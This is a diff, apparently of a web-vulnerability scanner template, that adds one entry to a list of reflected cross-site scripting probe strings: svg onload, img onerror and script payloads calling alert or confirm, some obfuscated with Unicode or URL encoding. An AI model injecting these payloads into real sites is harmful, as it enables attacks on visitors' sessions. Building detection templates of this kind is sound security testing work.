@@ -16,6 +16,7 @@ http:
       reflection:
         - '"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>'
         - "<Img Src=OnXSS OnError=confirm('Hacked_by_mijan')>"
+        - '"><SVG/oNlY=1 ONlOAD=confirm(document.cookie)>'
         - 'ab@gmail.com\"><svg/onload=alert(/xss/)>'
         - 'KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui'
         - "%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e"
